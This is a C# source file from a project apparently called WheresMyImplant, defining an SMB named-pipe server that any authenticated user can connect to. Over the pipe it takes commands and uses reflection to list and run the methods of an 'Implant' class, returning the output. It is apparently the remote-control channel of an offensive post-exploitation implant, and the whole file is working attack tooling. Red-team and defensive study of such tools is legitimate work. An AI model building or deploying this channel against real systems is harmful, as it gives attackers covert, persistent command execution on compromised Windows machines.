using System;
using System.Collections.Generic;
using System.IO.Pipes;
using System.Linq;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.IO;

namespace WheresMyImplant
{
    class SMBServer : IDisposable
    {
        private Boolean disposed = false;
        private NamedPipeServerStream namedPipeServerStream;
        private Dictionary<String, Type> mapping = new Dictionary<String, Type>();

        internal SMBServer()
        {
            SecurityIdentifier sid = new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null);
            PipeAccessRule access = new PipeAccessRule(sid, PipeAccessRights.ReadWrite, AccessControlType.Allow);
            PipeSecurity pipeSecurity = new PipeSecurity();
            pipeSecurity.AddAccessRule(access);
            namedPipeServerStream = new NamedPipeServerStream("FormalChicken", PipeDirection.InOut, 100, PipeTransmissionMode.Byte, PipeOptions.None, 0, 0, pipeSecurity);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            try
            {
                Dispose(true); //true: safe to free managed resources
            }
            finally
            {
                GC.SuppressFinalize(this);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        protected virtual void Dispose(bool disposing)
        {
            if (disposed)
            {
                return;
            }

            if (disposing)
            {
                try
                {
                    namedPipeServerStream.Flush();
                    namedPipeServerStream.Close();
                }
                catch (IOException error)
                {
                    Console.WriteLine("Pipe already closed");
                }
                catch (InvalidOperationException error)
                {
                    Console.WriteLine("Pipe already closed");
                }
            }
            disposed = true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal SMBServer(String pipeName)
        {
            SecurityIdentifier sid = new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null);
            PipeAccessRule access = new PipeAccessRule(sid, PipeAccessRights.ReadWrite, AccessControlType.Allow);
            PipeSecurity pipeSecurity = new PipeSecurity();
            pipeSecurity.AddAccessRule(access);
            namedPipeServerStream = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 100, PipeTransmissionMode.Byte, PipeOptions.None, 0, 0, pipeSecurity);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void WaitForConnection()
        {
            namedPipeServerStream.WaitForConnection();
            Byte[] buffer = recieveMessage();
            Console.WriteLine(Encoding.Unicode.GetString(buffer));
            if (Encoding.Unicode.GetString(buffer) != "PING")
            {
                return;
            }
            sendMessage("PONG");
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void MainLoop()
        {
            String[] splitCharacters = new String[]{"\0"};
            try
            {
                String strCommand = Encoding.Unicode.GetString(recieveMessage());
                String[] arrCommand = strCommand.Split(splitCharacters, StringSplitOptions.RemoveEmptyEntries);
                if (arrCommand.Length == 0)
                {
                    return;
                }
                String module = arrCommand.First().ToLower();
                if (module == "modules" || module == "listmodules")
                {
                    advertiseModules();
                }
                else if (module == "methods" || module == "listmethods")
                {
                    advertiseMethods();
                }
                else if (module == "parameters" || module == "listparameters")
                {
                    advertiseMethodParameters(arrCommand[1]);
                }
                else if (module == "parameters" || module == "listparameters")
                {
                    advertiseMethodParameters(arrCommand[1]);
                }
                else if (module == "usemodule")
                {
                    activateModule(arrCommand[1], new Object[] { }, new Object[] { });
                }
                else if (module == "usemethod")
                {
                    activateMethod(arrCommand[0], arrCommand.Skip(1).ToArray());
                }
                else
                {
                    activateMethod(arrCommand[0], arrCommand.Skip(1).ToArray());
                }
            }
            catch (Exception error)
            {
                Console.WriteLine(error);
                sendMessage("Invalid Command");
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void advertiseModules()
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            Type[] classes = assembly.GetTypes().Where(t => t.IsClass).ToArray();
            StringBuilder sbLoadedClasses = new StringBuilder();
            foreach (Type loadedClass in classes)
            {
                sbLoadedClasses.Append(loadedClass.ToString() + "\n");
                mapping[loadedClass.ToString()] = loadedClass;
            }
            Console.WriteLine(sbLoadedClasses.ToString());
            sendMessage(sbLoadedClasses.ToString());
        }

        ////////////////////////////////////////////////////////////////////////////////
        //https://stackoverflow.com/questions/7598088/purpose-of-activator-createinstance-with-example
        ////////////////////////////////////////////////////////////////////////////////
        internal static Object activateModule<T>()
        {
            Type localType = typeof(T);
            T instance = (T)Activator.CreateInstance(localType);
            return instance;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal String activateModule(String strModule, Object[] arguments, Object[] arguments2)
        {
            ConstructorInfo ctor = mapping[strModule].GetConstructors()[0];
            Object instance = ctor.Invoke(arguments);
            mapping[strModule].GetMethod("execute").Invoke(instance, arguments2);
            return(String)mapping[strModule].GetMethod("GetOutput").Invoke(instance, new Object[] {});
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void advertiseMethods()
        {
            String[] skipMethods = {
                "System.String ToString()",
                "Boolean Equals(System.Object)",
                "Int32 GetHashCode()",
                "System.Type GetType()"};

            MethodInfo[] methods = typeof(Implant).GetMethods();
            StringBuilder sbLoadedMethods = new StringBuilder();
            foreach (MethodInfo method in methods)
            {
                if (!skipMethods.Any(method.ToString().Contains))
                {
                    sbLoadedMethods.Append(method.ToString() + "\n");
                }
            }
            sendMessage(sbLoadedMethods.ToString());
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void advertiseMethodParameters(String method)
        {
            MethodInfo methodInfo = typeof(Implant).GetMethod(method);
            StringBuilder sbParameters = new StringBuilder();
            ParameterInfo[] parameterInfo = methodInfo.GetParameters();
            foreach (ParameterInfo parameter in parameterInfo)
            {
                sbParameters.Append(String.Format("{0}|{1}\0", parameter.Position, parameter.Name));
            }
            sendMessage(sbParameters.ToString());
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void activateMethod(String strMethod, Object[] arguments)
        {
            Console.WriteLine("Activating: {0}", strMethod);
            Type implantType = typeof(Implant);
            MethodInfo methodInfo = implantType.GetMethod(strMethod);
            String returnValue = (String)methodInfo.Invoke(null, arguments);
            sendMessage(returnValue);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Byte[] recieveMessage()
        {
            Byte[] buffer = new Byte[sizeof(Int32)];
            namedPipeServerStream.Read(buffer, 0, sizeof(Int32));
            Int32 messageSize = BitConverter.ToInt32(buffer, 0);
            buffer = new Byte[messageSize];
            namedPipeServerStream.Read(buffer, 0, messageSize);
            return buffer;
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void sendMessage(Byte[] message)
        {
            try
            {
                Byte[] buffer = new Byte[sizeof(Int32)];
                namedPipeServerStream.Write(BitConverter.GetBytes(message.Length), 0, sizeof(Int32));
                namedPipeServerStream.Write(message, 0, message.Length);
            }
            catch (IOException error)
            {
                return;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void sendMessage(String text)
        {
            try
            {
                Byte[] message = Encoding.Unicode.GetBytes(text);
                Byte[] buffer = new Byte[sizeof(Int32)];
                namedPipeServerStream.Write(BitConverter.GetBytes(message.Length), 0, sizeof(Int32));
                namedPipeServerStream.Write(message, 0, message.Length);
            }
            catch (IOException error)
            {
                return;
            }
        }
    }
}